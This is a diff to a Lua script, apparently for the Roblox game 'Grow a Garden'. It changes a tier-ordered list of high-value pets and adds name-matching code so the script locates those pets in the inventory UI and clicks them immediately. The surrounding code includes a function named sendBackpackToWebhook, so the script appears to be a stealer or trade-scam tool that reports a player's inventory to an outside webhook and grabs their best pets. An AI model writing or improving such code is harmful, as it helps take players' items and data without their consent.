@@ -76,11 +76,18 @@ local function sendBackpackToWebhook()
             or n:find("fertilizer") or n:find("hoe") or n:find("rake")
     end
 
-    -- Known pets from priority list + common ones
+    -- Known pets from Grow a Garden 2 tier list (S → C) + common variants
     local petSet = {}
-    for _, n in ipairs({"Raccoon","DragonFly","Unicorn","Bunny","Robin","Frog","Deer",
-                        "Cat","Dog","Hamster","Owl","Snake","Turtle","Pig","Cow",
-                        "Sheep","Chicken","Duck","Fox","Wolf","Bear","Panda","Penguin"}) do
+    for _, n in ipairs({
+        -- S tier
+        "Raccoon","Black Dragon","BlackDragon","Ice Serpent","IceSerpent","Unicorn",
+        -- A tier
+        "Bee","Golden Dragonfly","GoldenDragonfly","DragonFly","Dragonfly","Deer","Bunny",
+        -- B tier
+        "Frog",
+        -- C tier
+        "Robin","Owl","Monkey"
+    }) do
         petSet[n:lower()] = true
     end
 
@@ -482,16 +489,42 @@ local function runScript()
 
     -- ====================================================================
     -- STAGE 1: PRIORITY PET SELECTION (Clicks these immediately)
+    -- Ordered by Grow a Garden 2 tier list (S → C): best pets first
     -- ====================================================================
-    local priorityPets = {"Raccoon", "DragonFly", "Unicorn", "Bunny", "Robin", "Frog", "Deer"}
-    
+    local priorityPets = {
+        -- S tier
+        "Raccoon", "Black Dragon", "Ice Serpent", "Unicorn",
+        -- A tier
+        "Bee", "Golden Dragonfly", "Deer", "Bunny",
+        -- B tier
+        "Frog",
+        -- C tier
+        "Robin", "Owl", "Monkey"
+    }
+
+    -- Build a normalized lookup of every child once (so we can match
+    -- "Black Dragon" against "Inv_Pets:BlackDragon" or "Inv_Pets:Black Dragon" etc.)
+    local function normalizeName(s)
+        return (s:lower():gsub("[%s_%-]", ""))
+    end
+
+    local invChildrenByNorm = {}
+    for _, child in ipairs(inventoryFrame:GetChildren()) do
+        local cname = child.Name
+        if cname:sub(1, 9) == "Inv_Pets:" then
+            local petPart = cname:sub(10) -- everything after "Inv_Pets:"
+            invChildrenByNorm[normalizeName(petPart)] = child
+        end
+    end
+
     for _, petName in ipairs(priorityPets) do
-        local frameName = "Inv_Pets:" .. petName
-        local petFrame = inventoryFrame:FindFirstChild(frameName)
+        local key = normalizeName(petName)
+        local petFrame = invChildrenByNorm[key]
         if petFrame then
             task.spawn(function()
                 local innerFrame = petFrame:FindFirstChildWhichIsA("Frame") or petFrame
-                local button = innerFrame:FindFirstChildWhichIsA("GuiButton") or petFrame:FindFirstChildWhichIsA("GuiButton", true)
+                local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
+                    or petFrame:FindFirstChildWhichIsA("GuiButton", true)
                 if button then
                     clickButton(button)
                 end
